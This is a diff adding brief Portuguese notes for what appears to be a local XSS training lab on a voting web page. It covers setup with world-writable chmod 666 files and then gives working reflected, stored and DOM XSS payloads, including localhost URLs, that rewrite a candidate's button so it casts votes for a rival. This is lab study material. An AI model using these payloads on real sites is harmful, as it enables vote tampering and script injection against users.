@@ -1,0 +1,18 @@
+passar o conteúdo da pasta zipada para /var/www/html
+Dar um chmod 666 em votes e em comments.txt
+sudo chmod 666 votes.txt
+sudo chmod 666 comments.txt 
+
+
+joguar isso no campo de pesquisa para o  refletido:
+<script>document.querySelector("#candidate2 button").setAttribute("onclick", "vote(2); setTimeout(function() { document.querySelector('#candidate1 button').click(); }, 100);");</script>
+
+
+***Esse abaixo funciona Armazenado ( inseir nos comentários)
+<script>document.querySelector("#candidate2 button").setAttribute("onclick", "vote(2); setTimeout(function() { document.querySelector('#candidate1 button').click(); }, 100);");</script>
+
+Funcionou para o DOM XSS
+http://localhost/index8.php?query=document.querySelector(%27%23candidate2%20button%27).setAttribute(%27onclick%27,%20%27vote(2);%20setTimeout(function()%20{%20document.querySelector(%22%23candidate1%20button%22).click();%20},%20100);%27);
+
+versão modificada vm julia
+http://127.0.0.1/laboratorio/voting_lab.php?query=document.querySelector(%27%23candidate2%20button%27).setAttribute(%27onclick%27,%20%27vote(2);%20setTimeout(function()%20{%20document.querySelector(%22%23candidate1%20button%22).click();%20},%20100);%27);
